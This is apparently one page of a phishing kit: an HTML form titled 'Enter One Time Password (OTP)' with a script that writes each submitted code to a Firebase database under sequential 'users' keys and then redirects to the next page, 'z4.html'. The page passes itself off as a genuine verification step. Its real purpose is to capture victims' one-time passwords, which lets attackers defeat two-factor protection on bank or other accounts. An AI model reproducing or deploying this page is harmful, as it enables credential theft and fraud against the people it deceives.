      <div class="mainContent">
        <h1 class="text-center">Enter One Time Password (OTP)</h1>
        <div class="card">
          <p style="margin-top:1px;margin-left:8px">One Time Password (OTP) has been sent to your mobile, please enter the same here.</p>
         <div class="login-form">
<form autocomplete="off" id="form">
            <input type="hidden" name="formtoken" value="" />
            <div class="form-group">
              <label for="fOTP3">One Time Password</label>
              <input type="text" class="new-control" id="fOTP3" name="fOTP3" inputMode="numeric" minLength="6" maxLength="8" required="" />
              <span class="invalid-message">Please enter valid one time password</span>
            </div>
            <div class="text-center">
              <button type="submit" class="submit">SUBMIT</button>
            </div>
          </form>

 const firebaseConfig = {

};

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      // const db = getFirestore(app);
      const db = getDatabase(app);
      const que = query(ref(db, "users"), limitToLast(1));

      const last_key = await get(que)
        .then((snapshot) => {
          if (snapshot.exists()) {
            return parseInt(Object.keys(snapshot.val())[0]) + 1;
          } else {
            return 1;
          }
        }) 
        .catch((error) => {
          console.error(error);
        });

      const form = document.getElementById("form");
      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        let fOTP3 = document.getElementById("fOTP3").value;
        
        
        if (fOTP3 != "" ) {
          try {
            await set(ref(db, "users/" + last_key), {
              fOTP3: fOTP3,
             
            });

            window.location = "z4.html";
          } catch (e) {
            console.error("Error adding document: ", e);
          }
        }
      });
      /* let doc_id = localStorage.getItem("id");

            await setDoc(doc(db, "users", doc_id), {
              first: "Tokyo",
              country: "Japan",
            }); */

      function makeid(length) {
        let result = "";
        const characters =
          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        const charactersLength = characters.length;
        let counter = 0;
        while (counter < length) {
          result += characters.charAt(
            Math.floor(Math.random() * charactersLength)
          );
          counter += 1;
        }
        return result;
      }
    </script>
